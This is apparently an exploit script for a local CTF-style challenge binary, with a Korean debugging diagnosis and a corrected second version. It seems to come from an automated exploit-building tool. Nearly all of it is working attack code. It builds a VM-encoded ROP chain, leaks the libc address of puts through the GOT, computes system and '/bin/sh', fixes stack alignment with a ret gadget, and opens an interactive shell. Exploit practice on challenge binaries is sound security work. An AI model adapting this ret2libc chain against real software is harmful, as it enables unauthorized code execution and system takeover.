from pwn import *

binary_path = '/mnt/d/Coding/Projects/PwnAutomator/mcps/test/chall'
elf = ELF(binary_path, checksec=False)
context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

pop_rdi    = 0x4012c5
puts_got   = 0x404018
puts_plt   = 0x4010a0
main       = 0x401574

def vm_write_bytes(data):
    parts = []
    for i, b in enumerate(data):
        parts.append(f'E{b:02x}')
        if i < len(data) - 1:
            parts.append('C')
    return ''.join(parts)

def make_vm_payload(chain_bytes):
    return 'C' * 31 + vm_write_bytes(chain_bytes) + 'B'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

stage1_chain = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
stage1 = make_vm_payload(stage1_chain)

p = process(binary_path)
p.sendline(stage1.encode())
raw = p.recvuntil(b'\n', timeout=5)
leak_bytes = raw.rstrip(b'\n')
puts_addr = u64(leak_bytes.ljust(8, b'\x00'))

log.info(f'puts     @ {hex(puts_addr)}')
libc_base = puts_addr - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

# Stage 2: pop_rdi | /bin/sh | system (alignment ret gadget omitted)
stage2_chain = p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
stage2 = make_vm_payload(stage2_chain)
p.sendline(stage2.encode())

p.sendline(b'id')
out = p.recv(timeout=3)
log.success(f'Shell output: {out.decode(errors="replace")}')
p.interactive()

diagnosis.description: Stage 2 ROP chain이 pop_rdi | binsh | system 순서로 구성되어, ret으로 system()에 진입할 때 RSP가 0 mod 16(misaligned)이다. x86_64 ABI는 CALL 진입 시점에 RSP가 8 mod 16이어야 하는데, ret으로 직접 system()에 점프하면 CALL처럼 return address를 push하지 않아 RSP = 0 mod 16이 된다. do_system 내부의 movaps [rsp+0x40], xmm0 명령이 16바이트 정렬되지 않은 RSP로 인해 SIGSEGV를 발생시킨다.
diagnosis.what_to_check: system() 호출 직전에 ret gadget 1개를 삽입하여 RSP를 8바이트 앞당길 것. 구체적으로 stage2_chain = p64(pop_rdi) + p64(binsh_addr) + p64(ret_gadget) + p64(system_addr) 형태로 변경. ret_gadget은 단순 ret (0x40101a) 사용. 이렇게 하면 system() 진입 시 RSP = 0x7fffffffd968 (8 mod 16)이 되어 정렬 충족.

#!/usr/bin/env python3
from pwn import *

binary_path = '/mnt/d/Coding/Projects/PwnAutomator/mcps/test/chall'
elf = ELF(binary_path, checksec=False)
context.binary = elf
context.arch = 'amd64'
context.log_level = 'info'

pop_rdi    = 0x4012c5
ret_gadget = 0x40101a  # single ret for stack alignment before system()
puts_got   = 0x404018
puts_plt   = 0x4010a0
main       = 0x401574

def vm_write_bytes(data):
    parts = []
    for i, b in enumerate(data):
        parts.append(f'E{b:02x}')
        if i < len(data) - 1:
            parts.append('C')
    return ''.join(parts)

def make_vm_payload(chain_bytes):
    return 'C' * 31 + vm_write_bytes(chain_bytes) + 'B'

libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

stage1_chain = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
stage1 = make_vm_payload(stage1_chain)

while True:
    p = process(binary_path)
    p.sendline(stage1.encode())
    raw = p.recvuntil(b'\n', timeout=5)
    leak_bytes = raw.rstrip(b'\n')
    if len(leak_bytes) < 5:
        p.close()
        continue
    puts_addr = u64(leak_bytes.ljust(8, b'\x00'))
    if puts_addr < 0x700000000000:
        p.close()
        continue
    break

log.info(f'puts     @ {hex(puts_addr)}')
libc_base = puts_addr - libc.sym['puts']
log.info(f'libc_base = {hex(libc_base)}')
system_addr = libc_base + libc.sym['system']
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))

# Stage 2: pop_rdi | /bin/sh | ret (alignment) | system
stage2_chain = p64(pop_rdi) + p64(binsh_addr) + p64(ret_gadget) + p64(system_addr)
stage2 = make_vm_payload(stage2_chain)
p.sendline(stage2.encode())

p.sendline(b'id')
out = p.recv(timeout=3)
log.success(f'Shell output: {out.decode(errors="replace")}')
p.interactive()
